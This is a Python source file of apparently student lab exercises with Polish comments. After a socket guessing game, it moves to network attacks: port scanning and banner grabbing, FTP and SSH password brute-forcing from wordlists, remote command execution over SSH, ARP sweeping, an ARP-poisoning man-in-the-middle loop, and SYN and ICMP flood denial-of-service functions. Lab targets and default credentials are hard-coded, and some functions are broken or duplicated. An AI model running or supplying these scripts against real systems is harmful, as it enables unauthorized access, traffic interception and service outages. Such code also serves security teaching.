import fire

def task1_1():
    import socket
    import random
    s = socket.socket()
    s.bind(("0.0.0.0", 8083))
    s.listen(1)
    c, a = s.accept()
    counter = 0
    liczba = random.randint(0, 100)
    print(liczba)
    while True:
        msg = "Witaj, zganidj liczbe od zera do 100"
        c.send(msg.encode())    
        num_client = int(c.recv(2048).decode())
        print("liczba klienta" + str(num_client))    
        if num_client > liczba:
            s_msg = "Za duza"
            c.send(s_msg.encode())
        elif num_client < liczba:
            s_msg = "Za mala"
            c.send(s_msg.encode())
        else:
            print("ok!")
            s_msg = f"wygrales, {counter}"
            c.send(s_msg.encode())
            s2_msg = "konczymy gre"
            c.send(s2_msg.encode())
            break
        counter += 1
    s.close()

def task1_2():
    import socket
    s = socket.socket()
    s.connect(("127.0.0.1", 8083))
    while True:
        try:
            s_msg = s.recv(2084).decode()
            print(s_msg)
            if "konczymy" in s_msg:
                print("koniec gry")
                s.close()
                break
            else:
                c_mmsg = input("wiadomosc do serwera:")
                s.send(c_mmsg.encode())
        except Exception as error:
            print(error)
def task3():
    import socket
    import time
    targetIP = "192.168.11.118"
    for targetport in (80, 22, 21):
       # targetport = 21
        mySocket = socket.socket()
        mySocket.connect((targetIP, targetport))
        mySocket.send("Get header\n".encode())

        sendrecv = mySocket.recv(2048).decode()
        print(sendrecv)
        mySocket.close()
        time.sleep(1)


def task4():
    import socket
    s = socket.socket()
    s.connect(("192.168.11.118", 80))
    s.send("Get header\n".encode())
    r = s.recv(2048).decode()
    print(r)
    s.close()

def task5():
    import socket
    cel = input("podaj cel: ")
    IPfqdn = socket.gethostbyname(cel)
    print(IPfqdn)
    portList = [20, 21, 22, 23, 25, 80, 443]
    for port in portList:
        try:
            s = socket.socket()
            s.connect((IPfqdn, port))
            s.send("get header\r\n".encode())
            socket.setdefaulttimeout(4)
            sendRecv = s.recv(2048).decode()
            print(f"usługa to {sendRecv}")
        except ConnectionRefusedError as error:
            print("ERROR")
            print(f"Port {port} jest zamkniety: {error}")
        except Exception as error:
            print("ERROR")
            print(error)
        finally:
            print("==========================")
            s.close()

def task6():
    import ftplib
    try:
        targetIp = input("podaj address")
        targetPort = 21
        ftpServer = ftplib.FTP()
        ftpServer.connect(targetIp, targetPort, timeout=2)
        username = input("podaj nazwe urzytkownika: ")
        password = input("podaj haslo")
        ftpServer.login(username, password)
        print(f"the working directory is {ftpServer.pwd()}")
        ftpServer.storbinary("STOR plik55555_python.txt", open("/home/orpington/package.json", "rb"))
    except Exception as error:
        print(error)

def task7():
    import ftplib
    users = ["orpington", "edej", "sara"]
    passwords = ["abc", "passwd", "misie"]
    try:
        targetIp = "127.0.0.1"
        targetPort = 21
        ftpServer = ftplib.FTP()
        ftpServer.connect(targetIp, targetPort, timeout=2)
        for u in users:
            for p in passwords:
                try:
                    ftpServer.login(u, p)
                    print(f"the working directory is {ftpServer.pwd()}")
                except Exception as error:
                    print(f"failed {u}:{p}")
                    print(error)
    except Exception as error:
        print(error)

def task8():
    import ftplib
    class bcolors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKCYAN = '\033[96m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
    
    users = []
    passwords = []
    with open("users.txt", "r") as f:
        users = f.read().splitlines()
    with open("pass.txt", "r") as f:
        passwords = f.read().splitlines()        
    try:
        targetIp = "127.0.0.1"
        targetPort = 21
        ftpServer = ftplib.FTP()
        
        for u in users:
            for p in passwords:
                try:
                    ftpServer.connect(targetIp, targetPort, timeout=0.1)
                    ftpServer.login(u, p)
                    print(bcolors.OKGREEN + f"success! {u}:{p}")
                    #print(f"the working directory is {ftpServer.pwd()}")
                except Exception as error:
                    print(bcolors.FAIL + f"failed {u}:{p}")
                    #print(error)
                finally:
                    ftpServer.close()
    except Exception as error:
        print(error)

def task9():
    import paramiko
    targetIp = "192.168.11.118"
    targetPort = 22
    username = "kali"
    password = "kali"

    sshServer = paramiko.SSHClient()
    sshServer.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    sshServer.load_system_host_keys()
    sshServer.connect(targetIp, targetPort, username, password)
    stdin, stdout, stderr = sshServer.exec_command("ip a")
    for l in stdout.read().splitlines():
        print(l)

def task9():
    import paramiko
    import time
    targetIp = "192.168.11.118"
    targetPort = 22
    username = "kali"
    password = "kali"

    
    users = []
    passwords = []
    with open("users.txt", "r") as f:
        users = f.read().splitlines()
    with open("pass.txt", "r") as f:
        passwords = f.read().splitlines()
    for u in users:
        for p in passwords:
            time.sleep(0.5)
            try:

                sshServer = paramiko.SSHClient()
                sshServer.set_missing_host_key_policy(paramiko.AutoAddPolicy)
                sshServer.load_system_host_keys()
                sshServer.connect(targetIp, targetPort, u, p)
                stdin, stdout, stderr = sshServer.exec_command("ip a")
                print('\033[92m'+f"{u}:{p}" + "  success!")
                for l in stdout.read().splitlines()[:2]:
                    print(l)
            except paramiko.AuthenticationException as error:
                print('\033[91m' + f"{u}:{p}" + "  error")
            finally:
                sshServer.close()

def task10():
    import paramiko

    targetIp = "192.168.11.118"
    targetPort = 22
    username = "kali"
    password = "kali"
    sshServer = paramiko.SSHClient()
    sshServer.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    sshServer.load_system_host_keys()
    sshServer.connect(targetIp, targetPort, username, password)
    session = sshServer.get_transport().open_session()
    session.set_combine_stderr(True)
    session.get_pty()
    session.exec_command("sudo apt-get update")
    stdin = session.makefile('wb', -1)
    stdout = session.makefile('rb', -1)
    stdin.write(password + '\n')
    stdin.flush()
    print(stdout.read())


def task11():
    import scapy.all
    x=scapy.all.sniff(iface="lo", filter="icmp", count=8)
    x.show()

def task12():
    import scapy.all
    data1 = scapy.all.send(scapy.all.IP(src='192.168.11.118',dst='192.168.11.118')/scapy.all.TCP(dport=53,flags='S'))
    data2 = scapy.all.sendp(scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.all.IP(src='192.168.11.118',dst='192.168.11.118')/scapy.all.ICMP()/"Hacking is cool")

def task13():
    #target = "192.168.11.118"
    target = "127.0.0.1"
    #input("enter IP address: ")
    #target = "192.168.11.130"
    ports = [20, 21, 22, 80, 443]

    from scapy.all import sr1
    from scapy.layers.inet import IP, TCP

    #target = input("Enter ip address: ")

    for port in ports:
        packet = IP(dst=target) / TCP(dport=port, flags="S")
        response = sr1(packet, timeout=5, verbose=0)
        print(response,)
        if response is not None and response.haslayer(TCP):
                if response[TCP].flags == "SA":
                    print(f"Port {port} is open")
                elif response[TCP].flags == "RA":
                    print(f"Port {port} is closed")

#    scapy.all.sendp(scapy.all.Ether(src="192.168.11.118"), dst="192.168.11.118")
def task14():
    from scapy.all import srp1
    from scapy.layers.inet import Ether
    from scapy.layers.l2 import ARP

    for address in range(1, 255):
        ip = f"192.168.11.{address}"
        arp_out = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
        arp_in = srp1(arp_out, timeout=1, verbose=False)
        if arp_in:
            print(f"IP: {arp_in.psrc}, MAC: {arp_in.hwsrc}")

def task15():
    #nie dziala
    from scapy.all import sr1, send
    from scapy.layers.l2 import ARP
    import time

    gatewayIP = "192.168.11.118"
    targetIP =  "192.168.11.118"
    def getMac(ip):
        packet = ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip)
        resp = sr1(packet, timeout=1, verbose=False)
        return resp.hwsrc

    targetMac = getMac(targetIP)
    gatewayMac = getMac(gatewayIP)

    while True:
        send(ARP(op=2, pdst=gatewayIP, hwdst=gatewayMac, psrc=targetIP))
        send(op=2, pdst=targetIP, hwdst=targetMac, psrc=gatewayIP)
        time.sleep(2)

def task16():
    from scapy.all import send, srp
    from scapy.layers.l2 import ARP, Ether


    def arp_poison(ip_bramki, mac_bramki, ip_ofiary, mac_ofiary):
        while True:
            pakiet_do_bramki = ARP(op=2, pdst=ip_bramki, hwdst=mac_bramki, psrc=ip_ofiary)
            pakiet_do_ofiary = ARP(op=2, pdst=ip_ofiary, hwdst=mac_ofiary, psrc=ip_bramki)
            send(pakiet_do_bramki)
            send(pakiet_do_ofiary)

    def daj_mi_maca(ip):
        arp_wysyl = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
        ans, noans = srp(arp_wysyl, timeout=5, retry=2, verbose=False)
        for send, receive in ans:
            return receive[ARP].hwsrc
        return None

    ip_bramki = input("Daj IP bramki: ")
    ip_ofiary = input("Daj IP ofiary: ")
    mac_bramki = daj_mi_maca(ip_bramki)
    mac_ofiary = daj_mi_maca(ip_ofiary)
    arp_poison(ip_bramki, mac_bramki, ip_ofiary, mac_ofiary)

def task17():
    from scapy.all import send
    from scapy.layers.inet import IP, TCP

    def syn_flood(target_ip, target_port):
        pkt = IP(dst=target_ip)/TCP(dport=target_port, sport=RandShort(), flags="S")
        send(pkt/(b"X" * 60000), loop=1, verbose=False)

    def icmp_flood(target_ip):
        pkt = IP(dst=target_ip) / ICMP() / (b"X" * 60000)
        send(pkt, loop=1, verbose=False)

    target_ip = input("Target IP: ")
    target_port = int(input("Target port: "))
    icmp_flood(target_ip)
    syn_flood(target_ip, target_port)

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        fire.Fire()
    else:
        eval([line.split(" ")[1].split("(")[0] for line in open(__file__, "r") if "def" == line[0:3]].pop() + "()")
